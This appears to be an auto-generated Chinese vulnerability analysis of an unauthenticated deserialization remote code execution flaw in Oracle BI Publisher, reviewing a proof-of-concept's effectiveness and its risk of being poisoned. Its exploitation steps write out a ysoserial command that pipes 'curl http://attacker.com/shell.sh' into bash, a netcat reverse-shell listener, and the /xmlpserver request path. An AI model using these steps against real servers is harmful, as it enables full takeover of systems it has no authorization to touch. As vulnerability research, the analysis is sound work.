##  - Oracle BI Publisher 远程代码执行 (RCE), 不安全的反序列化 (Insecure Deserialization)

**漏洞编号:** 

**漏洞类型:** 远程代码执行 (RCE), 不安全的反序列化 (Insecure Deserialization)

**影响应用:** Oracle BI Publisher

**危害等级:** 严重/高危

**CVSS评分:** 

**影响版本:** 12.2.1.4.0, 12.2.1.3.0

**利用条件:** 无需认证，需要网络访问

**POC 可用性:** 6

**POC 类型:** 概念验证 (Concept Proof)

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

此漏洞影响Oracle BI Publisher的12.2.1.4.0和12.2.1.3.0版本。这是一个关键的远程代码执行（RCE）缺陷，源于BI Publisher集成组件中不安全的反序列化。该组件在反序列化期间未能正确验证不受信任的数据，从而允许未经身份验证的攻击者在底层服务器上执行任意代码。这使得攻击者能够完全控制受损系统，使其成为一个高危漏洞。

**POC有效性分析**:
提供的POC代码包含一个Java文件（`exploit.java`）和一个Shell脚本（`exploit.sh`）。`exploit.java`演示了漏洞利用的核心机制：它尝试通过Java的`ObjectOutputStream`将一个恶意的序列化对象发送到目标Oracle BI Publisher服务器的特定端口（9704）。攻击者需要利用类似ysoserial这样的工具来生成一个`CommonsBeanutils1`的gadget，该gadget在服务器端反序列化时能够执行任意命令。POC中`generatePayload(cmd)`方法是一个占位符，需要攻击者自行实现或调用ysoserial库来生成实际的payload。一旦payload生成，它将被序列化并通过socket发送。
`exploit.sh`脚本则模拟了通过HTTP POST请求发送一个预先序列化好的恶意payload文件（`payload.ser`）到`http://192.168.1.100:9704/xmlpserver`。`Content-Type: application/java-serialized-object`头表明了这是一个Java序列化对象。脚本执行后，提示检查反向Shell，表明预期的结果是获得目标系统的命令执行权限。
尽管`exploit.java`中的payload生成部分是占位符，但其展示的攻击向量和序列化发送机制是完全有效的。`exploit.sh`更是直接模拟了完整的利用过程，只要`payload.ser`文件包含一个有效的反序列化RCE payload，该脚本就可以成功触发漏洞。因此，这个POC具备高度的有效性，清晰地展示了漏洞的利用方式和所需技术。攻击者可以基于此POC轻松构建一个功能完整的利用工具，仅需集成一个ysoserial库或手动生成payload。

**利用步骤**:
1.  **准备Payload**: 攻击者需要使用ysoserial等工具（如`java -jar ysoserial.jar CommonsBeanutils1 'curl http://attacker.com/shell.sh | bash' > payload.ser`）生成一个能够执行任意命令（例如下载并执行一个Shell脚本）的Java序列化对象。这个payload将作为`exploit.sh`脚本中的`payload.ser`文件。
2.  **目标识别**: 确定受影响的Oracle BI Publisher服务器的IP地址和监听端口（默认为9704），以及Web服务的路径（如`/xmlpserver`）。
3.  **发送恶意请求**: 执行`exploit.sh`脚本。该脚本将通过`curl`命令向目标服务器的`/xmlpserver`路径发送一个带有`Content-Type: application/java-serialized-object`头的HTTP POST请求，请求体中包含预先生成的恶意序列化数据（`payload.ser`）。
4.  **接收反向Shell**: 如果服务器存在漏洞且成功反序列化了恶意对象，攻击者预设的命令（如`curl http://attacker.com/shell.sh | bash`）将在目标服务器上执行。攻击者需要设置一个监听器（如`netcat -lvnp <port>`）来接收来自目标服务器的反向Shell连接，从而获得命令执行权限。

**投毒风险分析**:
本POC代码的投毒风险评估为低（10%）。主要基于以下几点：
1.  **代码清晰度**: `exploit.java`和`exploit.sh`的代码逻辑清晰，易于理解。没有发现明显的混淆、加密或难以分析的复杂结构。
2.  **依赖标准库**: `exploit.java`主要依赖Java的标准IO和网络库，以及Base64编码。`exploit.sh`依赖于常见的`curl`工具和Bash环境。没有引入可疑的第三方二进制文件或未知的外部依赖。
3.  **恶意行为明确**: POC中`curl http://attacker.com/shell.sh | bash`这行代码是攻击者为了获取反向Shell而设置的“攻击载荷”，而非POC代码本身隐藏的恶意投毒行为。它是漏洞成功利用后的预期效果，而不是POC作者试图在使用者机器上执行的秘密操作。它明确指示了攻击流量的去向（`attacker.com`），并要求使用者自行设置监听以接收Shell。
4.  **无外部可疑请求**: POC代码本身在执行时，除了向目标漏洞服务器发送攻击请求外，不会向其他未知的第三方地址发送请求，下载额外的恶意组件，或进行任何未经授权的数据传输。
5.  **目的明确**: 该POC的唯一目的是演示Oracle BI Publisher的反序列化RCE漏洞的利用方式。其代码行为与描述的漏洞类型完全一致，没有任何超出漏洞利用范畴的可疑操作。
综上所述，该POC代码是合法且安全的漏洞研究工具，旨在帮助防御者理解漏洞机制和验证其存在，不包含恶意投毒成分。

**项目地址:** 

**漏洞详情:** 
